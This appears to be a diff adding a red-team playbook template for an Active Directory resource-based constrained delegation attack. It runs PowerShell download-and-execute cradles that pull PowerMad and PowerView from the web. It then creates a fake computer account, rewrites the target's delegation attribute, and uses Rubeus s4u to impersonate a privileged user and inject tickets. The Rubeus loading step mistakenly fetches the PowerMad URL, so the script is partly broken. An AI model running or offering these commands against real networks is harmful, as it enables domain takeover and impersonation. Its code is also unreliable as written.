@@ -1,0 +1,75 @@
+---
+params:
+  - name: Domain
+    description: FQDN for the domain
+  - name: Target Computer
+    description: Hotname of the target copmuter
+  - name: Target User
+    description: Userame for the impersonated account (probably DA)
+  - name: Fake Computer
+    description: Hostname for the new fake computer
+  - name: Fake Copmuter Password
+    description: Computer password for the new fake computer
+  - name: PowerMad
+    description: "Dependency: URI to download PowerMad"
+    default: https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+  - name: PowerView
+    description: "Dependency: URI to download PowerView"
+    default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+  - name: Rubeus
+    description: "Dependency: URI to download Rubeus"
+    default: ""
+  - name: RC4
+    description: RC4_HMAC result of the fake computer password
+sections:
+  - name: Info
+    labels: []
+    mitre: ""
+    commands:
+      - language: Prerequisites
+        command: |-
+          1 - Write privileges over the target computer object
+          .2 - Permissions to add computer
+          3 - At least  Windows 2012 DC
+      - language: Additional
+        command: |-
+          1 - For some reason SMB (after ticket injection) requires session to be elevated
+          2 - Powershell remoting does work in low privileged mode
+  - name: Load dependacies
+    labels: []
+    mitre: ""
+    commands:
+      - language: PS
+        command: |-
+          IEX (New-Object Net.WebClient).DownloadString('{{PowerMad}}');
+          IEX (New-Object Net.WebClient).DownloadString('{{PowerView}}');
+          $rubeusb64 = IEX (New-Object Net.WebClient).DownloadString('{{PowerMad}}');
+          $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($rubeusb64))
+  - name: Add fake computer
+    labels: []
+    mitre: ""
+    commands:
+      - language: PS
+        command:
+          New-MachineAccount -MachineAccount {{Fake Computer}} -Password $(ConvertTo-SecureString
+          '{{Fake Copmuter Password}}' -AsPlainText -Force) -Verbose
+  - name: Modifying Target Computer's AD Object and get RC4
+    labels: []
+    mitre: ""
+    commands:
+      - language: PS
+        command: |-
+          $fakesid = Get-DomainComputer {{Fake Computer}} | Select objectsid | Out-String
+          $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakesid)"
+          $SDBytes = New-Object byte[] ($SD.BinaryLength)
+          $SD.GetBinaryForm($SDBytes, 0)
+          Get-DomainComputer {{Target Computer}} | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+          [Rubeus.Program]::Main("hash /password:{{Fake Copmuter Password}} /user:{{Fake Computer}} /domain:{{Domain}}".Split())
+  - name: Execution
+    labels: []
+    mitre: ""
+    commands:
+      - language: PS
+        command:
+          '[Rubeus.Program]::Main("s4u /user:{{Fake Computer}}$ /rc4:{{RC4}} /impersonateuser:{{Target
+          User}} /msdsspn:CIFS/{{Target Computer}} /altservice:cifs,host,http /ptt".Split())'
